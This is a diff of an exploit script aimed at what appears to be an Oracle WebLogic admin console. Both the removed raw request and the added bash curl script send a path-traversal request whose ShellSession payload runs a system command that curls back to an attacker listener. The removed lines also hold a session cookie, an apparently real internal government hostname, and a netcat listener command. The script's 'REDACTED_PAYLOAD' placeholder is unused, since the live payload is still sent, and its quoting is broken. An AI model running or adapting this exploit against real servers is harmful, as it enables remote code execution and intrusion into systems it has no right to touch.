@@ -1,19 +1,23 @@
-POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
-Host: HOST:PORT
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-DNT: 1
-Connection: keep-alive
-Referer: http://vafscappfos401a.aac.dva.va.gov:32210/console/images/%252E%252E%252Fconsole.portal
-Cookie: ADMINCONSOLESESSION=vHAFF5NldCEfrCfb2qudMXK31E5wkLERzamMxbVvYz2WGvL1Uvja!743674651
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 164
+#!/usr/bin/env bash
 
-_nfpb=false&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("curl http://10.219.105.42:80");")
+if [ "$#" -lt 2 ]; then
+    echo "Usage: $0 <host> <port>"
+    exit 1
+fi
 
-# start a listener on your machine before sending in burp
-nc -nvlp 80
+HOST="$1"
+PORT="$2"
+
+URL="http://${HOST}:${PORT}/console/images/%252E%252E%252Fconsole.portal"
+
+# Replace this with your own SAFE test payload or lab-only PoC
+BODY="_nfpb=false&_pageLabel=HomePage1&handle=REDACTED_PAYLOAD"
+
+curl -k -i \
+  -X POST "$URL" \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+  -H "Accept-Language: en-US,en;q=0.5" \
+  -H "Connection: close" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "_nfpb=false&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("curl http://10.219.105.42:80");")"
